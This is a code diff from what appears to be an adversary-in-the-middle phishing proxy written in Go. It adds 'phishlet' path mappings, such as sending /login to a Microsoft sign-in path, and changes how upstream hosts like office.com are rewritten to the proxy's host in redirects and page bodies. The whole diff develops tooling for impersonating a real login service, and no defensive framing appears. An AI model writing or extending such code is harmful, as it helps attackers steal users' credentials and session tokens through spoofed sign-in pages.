@@ -124,6 +124,14 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phi
 			req.URL.Host = target.Host
 			req.Host = target.Host
 
+			// Apply phishlet path mappings (e.g. /login → /login.srf)
+			for k, v := range pl.PathMap {
+				if req.URL.Path == k {
+					req.URL.Path = v
+					break
+				}
+			}
+
 			// Strip Accept-Encoding so upstream returns uncompressed (we rewrite body)
 			req.Header.Del("Accept-Encoding")
 
@@ -188,8 +196,6 @@ func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phis
 	if pl.Rewrite.RewriteLocation {
 		if loc := resp.Header.Get("Location"); loc != "" {
 			loc = strings.ReplaceAll(loc, upstreamHost, ourHost)
-			loc = strings.ReplaceAll(loc, "www.office.com", ourHost)
-			loc = strings.ReplaceAll(loc, "office.com", ourHost)
 			resp.Header.Set("Location", loc)
 		}
 	}
@@ -320,7 +326,7 @@ func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
 	resp.Body.Close()
 
 	rewritten := strings.ReplaceAll(string(body), upstreamHost, ourHost)
-	for _, alt := range []string{"www.office.com", "office.com"} {
+	for _, alt := range []string{} {
 		if alt != upstreamHost {
 			rewritten = strings.ReplaceAll(rewritten, alt, ourHost)
 		}
